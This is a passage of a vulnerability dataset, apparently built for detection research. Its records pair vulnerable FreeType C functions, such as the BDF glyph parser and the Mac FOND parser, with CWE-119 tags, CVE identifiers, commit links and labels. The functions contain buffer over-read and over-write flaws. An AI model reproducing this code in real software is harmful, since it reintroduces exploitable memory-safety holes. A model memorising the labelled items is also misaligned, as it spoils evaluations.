p->glyph_enc = _bdf_atol( p->list.field[1], 0, 10 );\n\n      /* Normalize negative encoding values.  The specification only */\n      /* allows -1, but we can be more generous here.                */\n      if ( p->glyph_enc < -1 )\n        p->glyph_enc = -1;\n\n      /* Check for alternative encoding format. */\n       if ( p->glyph_enc == -1 && p->list.used > 2 )\n         p->glyph_enc = _bdf_atol( p->list.field[2], 0, 10 );\n \n       FT_TRACE4(( DBGMSG2, p->glyph_enc ));\n \n       /* Check that the encoding is in the Unicode range because  */\n                                   sizeof ( unsigned long ) * 32 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"ENCODING\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      /* Check whether this encoding has already been encountered. */\n      /* If it has then change it to unencoded so it gets added if */\n      /* indicated.                                                */\n      if ( p->glyph_enc >= 0 )\n      {\n        if ( _bdf_glyph_modified( p->have, p->glyph_enc ) )\n        {\n          /* Emit a message saying a glyph has been moved to the */\n          /* unencoded area.                                     */\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG12,\n                      p->glyph_enc, p->glyph_name ));\n          p->glyph_enc = -1;\n          font->modified = 1;\n        }\n        else\n          _bdf_set_glyph_modified( p->have, p->glyph_enc );\n      }\n\n      if ( p->glyph_enc >= 0 )\n      {\n        /* Make sure there are enough glyphs allocated in case the */\n        /* number of characters happen to be wrong.                */\n        if ( font->glyphs_used == font->glyphs_size )\n        {\n          if ( FT_RENEW_ARRAY( font->glyphs,\n                               font->glyphs_size,\n                               font->glyphs_size + 64 ) )\n            goto Exit;\n\n          font->glyphs_size += 64;\n        }\n\n        glyph           = font->glyphs + font->glyphs_used++;\n        glyph->name     = p->glyph_name;\n        glyph->encoding = p->glyph_enc;\n\n        /* Reset the initial glyph info. */\n        p->glyph_name = 0;\n      }\n      else\n      {\n        /* Unencoded glyph.  Check whether it should */\n        /* be added or not.                          */\n        if ( p->opts->keep_unencoded != 0 )\n        {\n          /* Allocate the next unencoded glyph. */\n          if ( font->unencoded_used == font->unencoded_size )\n          {\n            if ( FT_RENEW_ARRAY( font->unencoded ,\n                                 font->unencoded_size,\n                                 font->unencoded_size + 4 ) )\n              goto Exit;\n\n            font->unencoded_size += 4;\n          }\n\n          glyph           = font->unencoded + font->unencoded_used;\n          glyph->name     = p->glyph_name;\n          glyph->encoding = font->unencoded_used++;\n        }\n        else\n          /* Free up the glyph name if the unencoded shouldn't be */\n          /* kept.                                                */\n          FT_FREE( p->glyph_name );\n\n        p->glyph_name = 0;\n      }\n\n      /* Clear the flags that might be added when width and height are */\n      /* checked for consistency.                                      */\n      p->flags &= ~( _BDF_GLYPH_WIDTH_CHECK | _BDF_GLYPH_HEIGHT_CHECK );\n\n      p->flags |= _BDF_ENCODING;\n\n      goto Exit;\n    }\n\n    /* Point at the glyph being constructed. */\n    if ( p->glyph_enc == -1 )\n      glyph = font->unencoded + ( font->unencoded_used - 1 );\n    else\n      glyph = font->glyphs + ( font->glyphs_used - 1 );\n\n    /* Check whether a bitmap is being constructed. */\n    if ( p->flags & _BDF_BITMAP )\n    {\n      /* If there are more rows than are specified in the glyph metrics, */\n      /* ignore the remaining lines.                                     */\n      if ( p->row >= (unsigned long)glyph->bbx.height )\n      {\n        if ( !( p->flags & _BDF_GLYPH_HEIGHT_CHECK ) )\n        {\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG13, glyph->encoding ));\n          p->flags |= _BDF_GLYPH_HEIGHT_CHECK;\n          font->modified = 1;\n        }\n\n        goto Exit;\n      }\n\n      /* Only collect the number of nibbles indicated by the glyph     */\n      /* metrics.  If there are more columns, they are simply ignored. */\n      nibbles = glyph->bpr << 1;\n      bp      = glyph->bitmap + p->row * glyph->bpr;\n\n      for ( i = 0; i < nibbles; i++ )\n      {\n        c = line[i];\n        if ( !sbitset( hdigits, c ) )\n          break;\n        *bp = (FT_Byte)( ( *bp << 4 ) + a2i[c] );\n        if ( i + 1 < nibbles && ( i & 1 ) )\n          *++bp = 0;\n      }\n\n      /* If any line has not enough columns,            */\n      /* indicate they have been padded with zero bits. */\n      if ( i < nibbles                            &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG16, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      /* Remove possible garbage at the right. */\n      mask_index = ( glyph->bbx.width * p->font->bpp ) & 7;\n      if ( glyph->bbx.width )\n        *bp &= nibble_mask[mask_index];\n\n      /* If any line has extra columns, indicate they have been removed. */\n      if ( i == nibbles                           &&\n           sbitset( hdigits, line[nibbles] )      &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG14, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      p->row++;\n      goto Exit;\n    }\n\n    /* Expect the SWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"SWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->swidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n      p->flags |= _BDF_SWIDTH;\n\n      goto Exit;\n    }\n\n    /* Expect the DWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"DWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->dwidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n\n      if ( !( p->flags & _BDF_SWIDTH ) )\n      {\n        /* Missing SWIDTH field.  Emit an auto correction message and set */\n        /* the scalable width from the device width.                      */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG9, lineno ));\n\n        glyph->swidth = (unsigned short)FT_MulDiv(\n                          glyph->dwidth, 72000L,\n                          (FT_Long)( font->point_size *\n                                     font->resolution_x ) );\n      }\n\n      p->flags |= _BDF_DWIDTH;\n      goto Exit;\n    }\n\n    /* Expect the BBX field next. */\n    if ( ft_memcmp( line, \"BBX\", 3 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->bbx.width    = _bdf_atos( p->list.field[1], 0, 10 );\n      glyph->bbx.height   = _bdf_atos( p->list.field[2], 0, 10 );\n      glyph->bbx.x_offset = _bdf_atos( p->list.field[3], 0, 10 );\n      glyph->bbx.y_offset = _bdf_atos( p->list.field[4], 0, 10 );\n\n      /* Generate the ascent and descent of the character. */\n      glyph->bbx.ascent  = (short)( glyph->bbx.height + glyph->bbx.y_offset );\n      glyph->bbx.descent = (short)( -glyph->bbx.y_offset );\n\n      /* Determine the overall font bounding box as the characters are */\n      /* loaded so corrections can be done later if indicated.         */\n      p->maxas    = (short)FT_MAX( glyph->bbx.ascent, p->maxas );\n      p->maxds    = (short)FT_MAX( glyph->bbx.descent, p->maxds );\n\n      p->rbearing = (short)( glyph->bbx.width + glyph->bbx.x_offset );\n\n      p->maxrb    = (short)FT_MAX( p->rbearing, p->maxrb );\n      p->minlb    = (short)FT_MIN( glyph->bbx.x_offset, p->minlb );\n      p->maxlb    = (short)FT_MAX( glyph->bbx.x_offset, p->maxlb );\n\n      if ( !( p->flags & _BDF_DWIDTH ) )\n      {\n        /* Missing DWIDTH field.  Emit an auto correction message and set */\n        /* the device width to the glyph width.                           */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG10, lineno ));\n        glyph->dwidth = glyph->bbx.width;\n      }\n\n      /* If the BDF_CORRECT_METRICS flag is set, then adjust the SWIDTH */\n      /* value if necessary.                                            */\n      if ( p->opts->correct_metrics != 0 )\n      {\n        /* Determine the point size of the glyph. */\n        unsigned short  sw = (unsigned short)FT_MulDiv(\n                               glyph->dwidth, 72000L,\n                               (FT_Long)( font->point_size *\n                                          font->resolution_x ) );\n\n\n        if ( sw != glyph->swidth )\n        {\n          glyph->swidth = sw;\n\n          if ( p->glyph_enc == -1 )\n            _bdf_set_glyph_modified( font->umod,\n                                     font->unencoded_used - 1 );\n          else\n            _bdf_set_glyph_modified( font->nmod, glyph->encoding );\n\n          p->flags       |= _BDF_SWIDTH_ADJ;\n          font->modified  = 1;\n        }\n      }\n\n      p->flags |= _BDF_BBX;\n      goto Exit;\n    }\n\n    /* And finally, gather up the bitmap. */\n    if ( ft_memcmp( line, \"BITMAP\", 6 ) == 0 )\n    {\n      unsigned long  bitmap_size;\n\n\n      if ( !( p->flags & _BDF_BBX ) )\n      {\n        /* Missing BBX field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"BBX\" ));\n        error = BDF_Err_Missing_Bbx_Field;\n        goto Exit;\n      }\n\n      /* Allocate enough space for the bitmap. */\n      glyph->bpr = ( glyph->bbx.width * p->font->bpp + 7 ) >> 3;\n\n      bitmap_size = glyph->bpr * glyph->bbx.height;\n      if ( glyph->bpr > 0xFFFFU || bitmap_size > 0xFFFFU )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG4, lineno ));\n        error = BDF_Err_Bbx_Too_Big;\n        goto Exit;\n      }\n      else\n        glyph->bytes = (unsigned short)bitmap_size;\n\n      if ( FT_NEW_ARRAY( glyph->bitmap, glyph->bytes ) )\n        goto Exit;\n\n      p->row    = 0;\n      p->flags |= _BDF_BITMAP;\n\n      goto Exit;\n    }\n\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG9, lineno ));\n    error = BDF_Err_Invalid_File_Format;\n    goto Exit;\n\n  Missing_Encoding:\n    /* Missing ENCODING field. */\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"ENCODING\" ));\n    error = BDF_Err_Missing_Encoding_Field;\n\n  Exit:\n    if ( error && ( p->flags & _BDF_GLYPH ) )\n      FT_FREE( p->glyph_name );\n\n    return error;\n  }\n", "func_hash": 241612252320932154235102760135232983991, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-5670", "cve_desc": "The _bdf_parse_glyphs function in FreeType before 2.4.11 allows context-dependent attackers to cause a denial of service (out-of-bounds write and crash) via vectors related to BDF fonts and an ENCODING field with a negative value.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5670"}
{"idx": 166, "project": "savannah", "commit_id": "07bdb6e289c7954e2a533039dc93c1c136099d2d", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=07bdb6e289c7954e2a533039dc93c1c136099d2d", "commit_message": "None", "target": 1, "func": "  _bdf_parse_glyphs( char*          line,\n                     unsigned long  linelen,\n                     unsigned long  lineno,\n                     void*          call_data,\n                     void*          client_data )\n  {\n    int                c, mask_index;\n    char*              s;\n    unsigned char*     bp;\n    unsigned long      i, slen, nibbles;\n\n    _bdf_parse_t*      p;\n    bdf_glyph_t*       glyph;\n    bdf_font_t*        font;\n\n    FT_Memory          memory;\n    FT_Error           error = BDF_Err_Ok;\n\n    FT_UNUSED( call_data );\n    FT_UNUSED( lineno );        /* only used in debug mode */\n\n\n    p = (_bdf_parse_t *)client_data;\n\n    font   = p->font;\n    memory = font->memory;\n\n    /* Check for a comment. */\n    if ( ft_memcmp( line, \"COMMENT\", 7 ) == 0 )\n    {\n      linelen -= 7;\n\n      s = line + 7;\n      if ( *s != 0 )\n      {\n        s++;\n        linelen--;\n      }\n      error = _bdf_add_comment( p->font, s, linelen );\n      goto Exit;\n    }\n\n    /* The very first thing expected is the number of glyphs. */\n    if ( !( p->flags & _BDF_GLYPHS ) )\n    {\n      if ( ft_memcmp( line, \"CHARS\", 5 ) != 0 )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"CHARS\" ));\n        error = BDF_Err_Missing_Chars_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n      p->cnt = font->glyphs_size = _bdf_atoul( p->list.field[1], 0, 10 );\n\n      /* Make sure the number of glyphs is non-zero. */\n      if ( p->cnt == 0 )\n        font->glyphs_size = 64;\n\n      /* Limit ourselves to 1,114,112 glyphs in the font (this is the */\n      /* number of code points available in Unicode).                 */\n      if ( p->cnt >= 0x110000UL )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"CHARS\" ));\n        error = BDF_Err_Invalid_Argument;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( font->glyphs, font->glyphs_size ) )\n        goto Exit;\n\n      p->flags |= _BDF_GLYPHS;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDFONT field. */\n    if ( ft_memcmp( line, \"ENDFONT\", 7 ) == 0 )\n    {\n      /* Sort the glyphs by encoding. */\n      ft_qsort( (char *)font->glyphs,\n                font->glyphs_used,\n                sizeof ( bdf_glyph_t ),\n                by_encoding );\n\n      p->flags &= ~_BDF_START;\n\n      goto Exit;\n    }\n\n    /* Check for the ENDCHAR field. */\n    if ( ft_memcmp( line, \"ENDCHAR\", 7 ) == 0 )\n    {\n      p->glyph_enc = 0;\n      p->flags    &= ~_BDF_GLYPH_BITS;\n\n      goto Exit;\n    }\n\n    /* Check whether a glyph is being scanned but should be */\n    /* ignored because it is an unencoded glyph.            */\n    if ( ( p->flags & _BDF_GLYPH )     &&\n         p->glyph_enc            == -1 &&\n         p->opts->keep_unencoded == 0  )\n      goto Exit;\n\n    /* Check for the STARTCHAR field. */\n    if ( ft_memcmp( line, \"STARTCHAR\", 9 ) == 0 )\n    {\n      /* Set the character name in the parse info first until the */\n      /* encoding can be checked for an unencoded character.      */\n      FT_FREE( p->glyph_name );\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      _bdf_list_shift( &p->list, 1 );\n\n      s = _bdf_list_join( &p->list, ' ', &slen );\n\n      if ( !s )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG8, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Invalid_File_Format;\n        goto Exit;\n      }\n\n      if ( FT_NEW_ARRAY( p->glyph_name, slen + 1 ) )\n        goto Exit;\n\n      FT_MEM_COPY( p->glyph_name, s, slen + 1 );\n\n      p->flags |= _BDF_GLYPH;\n\n      FT_TRACE4(( DBGMSG1, lineno, s ));\n\n      goto Exit;\n    }\n\n    /* Check for the ENCODING field. */\n    if ( ft_memcmp( line, \"ENCODING\", 8 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_GLYPH ) )\n      {\n        /* Missing STARTCHAR field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"STARTCHAR\" ));\n        error = BDF_Err_Missing_Startchar_Field;\n        goto Exit;\n      }\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      p->glyph_enc = _bdf_atol( p->list.field[1], 0, 10 );\n\n      /* Normalize negative encoding values.  The specification only */\n      /* allows -1, but we can be more generous here.                */\n      if ( p->glyph_enc < -1 )\n        p->glyph_enc = -1;\n\n      /* Check for alternative encoding format. */\n      if ( p->glyph_enc == -1 && p->list.used > 2 )\n        p->glyph_enc = _bdf_atol( p->list.field[2], 0, 10 );\n\n      FT_TRACE4(( DBGMSG2, p->glyph_enc ));\n \n       /* Check that the encoding is in the Unicode range because  */\n       /* otherwise p->have (a bitmap with static size) overflows. */\n      if ( p->glyph_enc > 0                               &&\n           (size_t)p->glyph_enc >= sizeof ( p->have ) * 8 )\n       {\n         FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG5, lineno, \"ENCODING\" ));\n         error = BDF_Err_Invalid_File_Format;\n      }\n\n      /* Check whether this encoding has already been encountered. */\n      /* If it has then change it to unencoded so it gets added if */\n      /* indicated.                                                */\n      if ( p->glyph_enc >= 0 )\n      {\n        if ( _bdf_glyph_modified( p->have, p->glyph_enc ) )\n        {\n          /* Emit a message saying a glyph has been moved to the */\n          /* unencoded area.                                     */\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG12,\n                      p->glyph_enc, p->glyph_name ));\n          p->glyph_enc = -1;\n          font->modified = 1;\n        }\n        else\n          _bdf_set_glyph_modified( p->have, p->glyph_enc );\n      }\n\n      if ( p->glyph_enc >= 0 )\n      {\n        /* Make sure there are enough glyphs allocated in case the */\n        /* number of characters happen to be wrong.                */\n        if ( font->glyphs_used == font->glyphs_size )\n        {\n          if ( FT_RENEW_ARRAY( font->glyphs,\n                               font->glyphs_size,\n                               font->glyphs_size + 64 ) )\n            goto Exit;\n\n          font->glyphs_size += 64;\n        }\n\n        glyph           = font->glyphs + font->glyphs_used++;\n        glyph->name     = p->glyph_name;\n        glyph->encoding = p->glyph_enc;\n\n        /* Reset the initial glyph info. */\n        p->glyph_name = 0;\n      }\n      else\n      {\n        /* Unencoded glyph.  Check whether it should */\n        /* be added or not.                          */\n        if ( p->opts->keep_unencoded != 0 )\n        {\n          /* Allocate the next unencoded glyph. */\n          if ( font->unencoded_used == font->unencoded_size )\n          {\n            if ( FT_RENEW_ARRAY( font->unencoded ,\n                                 font->unencoded_size,\n                                 font->unencoded_size + 4 ) )\n              goto Exit;\n\n            font->unencoded_size += 4;\n          }\n\n          glyph           = font->unencoded + font->unencoded_used;\n          glyph->name     = p->glyph_name;\n          glyph->encoding = font->unencoded_used++;\n        }\n        else\n          /* Free up the glyph name if the unencoded shouldn't be */\n          /* kept.                                                */\n          FT_FREE( p->glyph_name );\n\n        p->glyph_name = 0;\n      }\n\n      /* Clear the flags that might be added when width and height are */\n      /* checked for consistency.                                      */\n      p->flags &= ~( _BDF_GLYPH_WIDTH_CHECK | _BDF_GLYPH_HEIGHT_CHECK );\n\n      p->flags |= _BDF_ENCODING;\n\n      goto Exit;\n    }\n\n    /* Point at the glyph being constructed. */\n    if ( p->glyph_enc == -1 )\n      glyph = font->unencoded + ( font->unencoded_used - 1 );\n    else\n      glyph = font->glyphs + ( font->glyphs_used - 1 );\n\n    /* Check whether a bitmap is being constructed. */\n    if ( p->flags & _BDF_BITMAP )\n    {\n      /* If there are more rows than are specified in the glyph metrics, */\n      /* ignore the remaining lines.                                     */\n      if ( p->row >= (unsigned long)glyph->bbx.height )\n      {\n        if ( !( p->flags & _BDF_GLYPH_HEIGHT_CHECK ) )\n        {\n          FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG13, glyph->encoding ));\n          p->flags |= _BDF_GLYPH_HEIGHT_CHECK;\n          font->modified = 1;\n        }\n\n        goto Exit;\n      }\n\n      /* Only collect the number of nibbles indicated by the glyph     */\n      /* metrics.  If there are more columns, they are simply ignored. */\n      nibbles = glyph->bpr << 1;\n      bp      = glyph->bitmap + p->row * glyph->bpr;\n\n      for ( i = 0; i < nibbles; i++ )\n      {\n        c = line[i];\n        if ( !sbitset( hdigits, c ) )\n          break;\n        *bp = (FT_Byte)( ( *bp << 4 ) + a2i[c] );\n        if ( i + 1 < nibbles && ( i & 1 ) )\n          *++bp = 0;\n      }\n\n      /* If any line has not enough columns,            */\n      /* indicate they have been padded with zero bits. */\n      if ( i < nibbles                            &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG16, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      /* Remove possible garbage at the right. */\n      mask_index = ( glyph->bbx.width * p->font->bpp ) & 7;\n      if ( glyph->bbx.width )\n        *bp &= nibble_mask[mask_index];\n\n      /* If any line has extra columns, indicate they have been removed. */\n      if ( i == nibbles                           &&\n           sbitset( hdigits, line[nibbles] )      &&\n           !( p->flags & _BDF_GLYPH_WIDTH_CHECK ) )\n      {\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG14, glyph->encoding ));\n        p->flags       |= _BDF_GLYPH_WIDTH_CHECK;\n        font->modified  = 1;\n      }\n\n      p->row++;\n      goto Exit;\n    }\n\n    /* Expect the SWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"SWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->swidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n      p->flags |= _BDF_SWIDTH;\n\n      goto Exit;\n    }\n\n    /* Expect the DWIDTH (scalable width) field next. */\n    if ( ft_memcmp( line, \"DWIDTH\", 6 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->dwidth = (unsigned short)_bdf_atoul( p->list.field[1], 0, 10 );\n\n      if ( !( p->flags & _BDF_SWIDTH ) )\n      {\n        /* Missing SWIDTH field.  Emit an auto correction message and set */\n        /* the scalable width from the device width.                      */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG9, lineno ));\n\n        glyph->swidth = (unsigned short)FT_MulDiv(\n                          glyph->dwidth, 72000L,\n                          (FT_Long)( font->point_size *\n                                     font->resolution_x ) );\n      }\n\n      p->flags |= _BDF_DWIDTH;\n      goto Exit;\n    }\n\n    /* Expect the BBX field next. */\n    if ( ft_memcmp( line, \"BBX\", 3 ) == 0 )\n    {\n      if ( !( p->flags & _BDF_ENCODING ) )\n        goto Missing_Encoding;\n\n      error = _bdf_list_split( &p->list, (char *)\" +\", line, linelen );\n      if ( error )\n        goto Exit;\n\n      glyph->bbx.width    = _bdf_atos( p->list.field[1], 0, 10 );\n      glyph->bbx.height   = _bdf_atos( p->list.field[2], 0, 10 );\n      glyph->bbx.x_offset = _bdf_atos( p->list.field[3], 0, 10 );\n      glyph->bbx.y_offset = _bdf_atos( p->list.field[4], 0, 10 );\n\n      /* Generate the ascent and descent of the character. */\n      glyph->bbx.ascent  = (short)( glyph->bbx.height + glyph->bbx.y_offset );\n      glyph->bbx.descent = (short)( -glyph->bbx.y_offset );\n\n      /* Determine the overall font bounding box as the characters are */\n      /* loaded so corrections can be done later if indicated.         */\n      p->maxas    = (short)FT_MAX( glyph->bbx.ascent, p->maxas );\n      p->maxds    = (short)FT_MAX( glyph->bbx.descent, p->maxds );\n\n      p->rbearing = (short)( glyph->bbx.width + glyph->bbx.x_offset );\n\n      p->maxrb    = (short)FT_MAX( p->rbearing, p->maxrb );\n      p->minlb    = (short)FT_MIN( glyph->bbx.x_offset, p->minlb );\n      p->maxlb    = (short)FT_MAX( glyph->bbx.x_offset, p->maxlb );\n\n      if ( !( p->flags & _BDF_DWIDTH ) )\n      {\n        /* Missing DWIDTH field.  Emit an auto correction message and set */\n        /* the device width to the glyph width.                           */\n        FT_TRACE2(( \"_bdf_parse_glyphs: \" ACMSG10, lineno ));\n        glyph->dwidth = glyph->bbx.width;\n      }\n\n      /* If the BDF_CORRECT_METRICS flag is set, then adjust the SWIDTH */\n      /* value if necessary.                                            */\n      if ( p->opts->correct_metrics != 0 )\n      {\n        /* Determine the point size of the glyph. */\n        unsigned short  sw = (unsigned short)FT_MulDiv(\n                               glyph->dwidth, 72000L,\n                               (FT_Long)( font->point_size *\n                                          font->resolution_x ) );\n\n\n        if ( sw != glyph->swidth )\n        {\n          glyph->swidth = sw;\n\n          if ( p->glyph_enc == -1 )\n            _bdf_set_glyph_modified( font->umod,\n                                     font->unencoded_used - 1 );\n          else\n            _bdf_set_glyph_modified( font->nmod, glyph->encoding );\n\n          p->flags       |= _BDF_SWIDTH_ADJ;\n          font->modified  = 1;\n        }\n      }\n\n      p->flags |= _BDF_BBX;\n      goto Exit;\n    }\n\n    /* And finally, gather up the bitmap. */\n    if ( ft_memcmp( line, \"BITMAP\", 6 ) == 0 )\n    {\n      unsigned long  bitmap_size;\n\n\n      if ( !( p->flags & _BDF_BBX ) )\n      {\n        /* Missing BBX field. */\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"BBX\" ));\n        error = BDF_Err_Missing_Bbx_Field;\n        goto Exit;\n      }\n\n      /* Allocate enough space for the bitmap. */\n      glyph->bpr = ( glyph->bbx.width * p->font->bpp + 7 ) >> 3;\n\n      bitmap_size = glyph->bpr * glyph->bbx.height;\n      if ( glyph->bpr > 0xFFFFU || bitmap_size > 0xFFFFU )\n      {\n        FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG4, lineno ));\n        error = BDF_Err_Bbx_Too_Big;\n        goto Exit;\n      }\n      else\n        glyph->bytes = (unsigned short)bitmap_size;\n\n      if ( FT_NEW_ARRAY( glyph->bitmap, glyph->bytes ) )\n        goto Exit;\n\n      p->row    = 0;\n      p->flags |= _BDF_BITMAP;\n\n      goto Exit;\n    }\n\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG9, lineno ));\n    error = BDF_Err_Invalid_File_Format;\n    goto Exit;\n\n  Missing_Encoding:\n    /* Missing ENCODING field. */\n    FT_ERROR(( \"_bdf_parse_glyphs: \" ERRMSG1, lineno, \"ENCODING\" ));\n    error = BDF_Err_Missing_Encoding_Field;\n\n  Exit:\n    if ( error && ( p->flags & _BDF_GLYPH ) )\n      FT_FREE( p->glyph_name );\n\n    return error;\n  }\n", "func_hash": 339135483814426971995983985697178320662, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2012-5669", "cve_desc": "The _bdf_parse_glyphs function in FreeType before 2.4.11 allows context-dependent attackers to cause a denial of service (crash) and possibly execute arbitrary code via vectors related to BDF fonts and an incorrect calculation that triggers an out-of-bounds read.", "nvd_url": "https://nvd.nist.gov/vuln/detail/CVE-2012-5669"}
{"idx": 179, "project": "savannah", "commit_id": "18a8f0d9943369449bc4de92d411c78fb08d616c", "project_url": "https://git.savannah.gnu.org/gitweb/?p=gnutls", "commit_url": "https://git.savannah.gnu.org/cgit/freetype/freetype2.git/commit/?id=18a8f0d9943369449bc4de92d411c78fb08d616c", "commit_message": "None", "target": 1, "func": "  parse_fond( char*   fond_data,\n              short*  have_sfnt,\n              ResID*  sfnt_id,\n              Str255  lwfn_file_name,\n              short   face_index )\n  {\n    AsscEntry*  assoc;\n    AsscEntry*  base_assoc;\n    FamRec*     fond;\n\n\n    *sfnt_id          = 0;\n    *have_sfnt        = 0;\n    lwfn_file_name[0] = 0;\n\n    fond       = (FamRec*)fond_data;\n    assoc      = (AsscEntry*)( fond_data + sizeof ( FamRec ) + 2 );\n    base_assoc = assoc;\n\n    /* the maximum faces in a FOND is 48, size of StyleTable.indexes[] */\n    if ( 47 < face_index )\n      return;\n\n    /* Let's do a little range checking before we get too excited here */\n    if ( face_index < count_faces_sfnt( fond_data ) )\n    {\n      assoc += face_index;        /* add on the face_index! */\n\n      /* if the face at this index is not scalable,\n         fall back to the first one (old behavior) */\n      if ( EndianS16_BtoN( assoc->fontSize ) == 0 )\n      {\n        *have_sfnt = 1;\n        *sfnt_id   = EndianS16_BtoN( assoc->fontID );\n      }\n      else if ( base_assoc->fontSize == 0 )\n      {\n        *have_sfnt = 1;\n        *sfnt_id   = EndianS16_BtoN( base_assoc->fontID );\n      }\n    }\n\n    if ( EndianS32_BtoN( fond->ffStylOff ) )\n    {\n      unsigned char*  p = (unsigned char*)fond_data;\n      StyleTable*     style;\n      unsigned short  string_count;\n      char            ps_name[256];\n      unsigned char*  names[64];\n      int             i;\n\n\n      p += EndianS32_BtoN( fond->ffStylOff );\n       style = (StyleTable*)p;\n       p += sizeof ( StyleTable );\n       string_count = EndianS16_BtoN( *(short*)(p) );\n       p += sizeof ( short );\n \n      for ( i = 0; i < string_count && i < 64; i++ )\n       {\n         names[i] = p;\n         p       += names[i][0];\n      }\n\n      {\n        size_t  ps_name_len = (size_t)names[0][0];\n\n\n        if ( ps_name_len != 0 )\n        {\n          ft_memcpy(ps_name, names[0] + 1, ps_name_len);\n          ps_name[ps_name_len] = 0;\n           ps_name[ps_name_len] = 0;\n         }\n         if ( style->indexes[face_index] > 1 &&\n             style->indexes[face_index] <= FT_MIN( string_count, 64 ) )\n         {\n           unsigned char*  suffixes = names[style->indexes[face_index] - 1];\n          for ( i = 1; i <= suffixes[0]; i++ )\n          {\n            unsigned char*  s;\n            size_t          j = suffixes[i] - 1;\n\n\n            if ( j < string_count && ( s = names[j] ) != NULL )\n            {\n              size_t  s_len = (size_t)s[0];\n\n\n              if ( s_len != 0 && ps_name_len + s_len < sizeof ( ps_name ) )\n              {\n                ft_memcpy( ps_name + ps_name_len, s + 1, s_len );\n                ps_name_len += s_len;\n                ps_name[ps_name_len] = 0;\n              }\n            }\n          }\n        }\n      }\n\n      create_lwfn_name( ps_name, lwfn_file_name );\n    }\n  }\n", "func_hash": 233045259701863811358636688341910118112, "file_name": "None", "file_hash": null, "cwe": ["CWE-119"], "cve": "CVE-2014-9672", "cve_desc": "Array index error in the parse_fond function in base/ftmac.c in FreeType before 2.5.4 allows remote attackers to cause a denial of service (out-of-bounds read) or obtain sensitive information from process memory via a crafted FOND 